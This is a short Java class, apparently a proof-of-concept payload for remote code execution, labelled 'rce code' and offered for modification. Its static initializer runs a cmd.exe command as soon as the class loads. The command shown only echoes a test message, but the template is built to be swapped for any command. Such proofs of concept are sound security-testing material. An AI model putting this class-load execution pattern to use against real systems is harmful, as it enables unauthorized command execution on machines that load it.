// this is rce code.
// you can modify it.

import java.lang.Runtime;

public class RCE {

    static {
        try {
            Runtime.getRuntime().exec("cmd.exe /c start echo xRCE Test").waitFor();
        } catch (Exception e) {
            System.out.println(e);
        }
    }

}